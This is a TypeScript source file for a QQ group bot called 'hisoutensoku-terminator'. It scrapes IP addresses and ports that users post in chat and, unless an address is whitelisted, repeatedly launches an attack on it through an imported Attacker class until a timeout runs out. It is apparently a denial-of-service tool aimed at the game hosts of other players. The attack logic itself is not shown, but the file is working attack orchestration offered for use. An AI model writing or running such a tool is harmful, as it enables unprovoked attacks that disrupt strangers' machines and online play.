import bunyan from "bunyan";
import fs from "fs";
import _ from "underscore";
import yaml from "yaml";
import { spawn } from "child_process";
import { Attacker } from "./attacker";
import moment from "moment";
import {AppConfig, App, Meta} from "koishi";

interface Config {
	address: string;
	port: number;
	coolq: AppConfig;
	floodQQGroups: Array<number>;
	attackTimeout: number;
	addressWhitelist: string[];
}

const log = bunyan.createLogger({
	name: "hisoutensoku-terminator"
});

let app: App, config: Config;

async function startAttack(address: string, port: number): Promise<boolean> {
	if (_.contains(config.addressWhitelist, address)) {
		log.info(`Attack of ${address}:${port} skipped.`);
		return false;
	}
	log.info(`Attack of ${address}:${port} started.`);
	let curTime: moment.Moment = moment();
	while (moment().diff(curTime) <= config.attackTimeout) {
		const attacker = new Attacker(address, port, 1000);
		let err;
		try {
			err = await attacker.attack();
		} catch(e) {
			err = `Error: ${e.toString()}`;
		}
		if (err) {
			log.warn(`Attack of ${address}:${port} failed: ${err}`);
		} else {
			log.warn(`Attack of ${address}:${port} succeeded.`);
		}
	}
	log.info(`Attack of ${address}:${port} finished.`);
	return true;
}

async function messageHandler(data: Meta<"message">): Promise<void> {
	const messageMatch: RegExpMatchArray = data.message.match(/(\d{1,3}([\.: \uff1a]\d{1,3}){3})[\.: \uff1a]+(\d{4,5})/g);
	if (!messageMatch) {
		return;
	}
	const attackPromises = messageMatch.map(pattern => {
		const patternArray = pattern.split(/[\.: \uff1a]/);
		const address = patternArray.slice(0, 4).join(".");
		const port = parseInt(patternArray[patternArray.length - 1]);
		return startAttack(address, port);
	});
	const results: boolean[] = await Promise.all(attackPromises);
}

async function main(): Promise<void> {
	config = yaml.parse(await fs.promises.readFile("./config.yaml", "utf8")) as Config;
	app = new App(config.coolq);
	app.group(...config.floodQQGroups).receiver.on("message", messageHandler);
	await app.start();
 }
main();
